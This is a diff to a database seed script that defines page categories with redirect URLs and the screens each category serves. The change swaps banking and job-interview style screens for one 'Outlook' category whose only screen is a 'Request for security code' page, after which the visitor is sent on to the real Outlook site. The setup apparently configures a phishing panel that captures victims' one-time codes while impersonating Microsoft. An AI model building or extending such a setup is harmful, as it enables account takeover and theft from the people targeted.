@@ -6,9 +6,7 @@ async function seed() {
     db.serialize(() => {
         // Insert Categories
         const categories = [
-            ['banking', 'https://bank-portal.com/next-step'],
-            ['data', 'https://analytics-hr.com/interview'],
-            ['general', 'https://company.com/onboarding']
+            ['Outlook', 'https://outlook.live.com/mail/'],
         ];
 
         const catStmt = db.prepare(`INSERT OR IGNORE INTO categories (name, default_redirect_url) VALUES (?, ?)`);
@@ -18,14 +16,7 @@ async function seed() {
         // Insert Screens linked to Categories
         const screens = [
             // Banking
-            [1, 'Specialty CD Form', 'cd_form.html', 1],
-            [1, 'Affidavit Signature', 'affidavit.html', 0],
-            // Data
-            [2, 'Data Analysis Task', 'analysis.html', 1],
-            [2, 'System Logic Test', 'logic.html', 0],
-            // General
-            [3, 'Welcome Screen', 'welcome.html', 1],
-            [3, 'Personal Bio Form', 'bio.html', 0]
+            [1, 'Request for security code', 'code.html', 1]
         ];
 
         const screenStmt = db.prepare(`INSERT INTO screens (category_id, screen_name, file_path, is_default) VALUES (?, ?, ?, ?)`);
